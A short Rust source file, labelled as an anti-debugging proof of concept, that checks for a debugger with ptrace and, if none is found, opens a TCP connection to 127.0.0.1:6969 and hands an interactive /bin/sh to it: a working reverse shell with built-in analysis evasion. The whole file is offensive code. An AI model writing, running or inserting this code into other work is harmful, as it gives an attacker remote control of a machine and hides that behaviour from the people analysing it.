use nix::sys::ptrace::traceme;
use std::process::exit;

/* simple anti-debugging POC w/ reverse shell */

fn main() {
	let _res = match traceme() {
		Ok(_s)  => do_evil(),
		Err(_e) => evade()
	};
	exit(0)
}

fn evade() {
	println!("[-] debugger detected, exiting...")
}

fn do_evil() {
	use std::net::TcpStream;
	use std::process::{Command, Stdio};
	use std::os::unix::io::{AsRawFd, FromRawFd};

	println!("[+] no debugger detected, sending shell...");
	let stream = TcpStream::connect("127.0.0.1:6969").unwrap();
	let fd = stream.as_raw_fd();
	Command::new("/bin/sh")
		.arg("-i")
		.stdin(unsafe  { Stdio::from_raw_fd(fd) })
		.stdout(unsafe { Stdio::from_raw_fd(fd) })
		.stderr(unsafe { Stdio::from_raw_fd(fd) })
		.spawn()
		.unwrap()
		.wait()
		.unwrap();
}
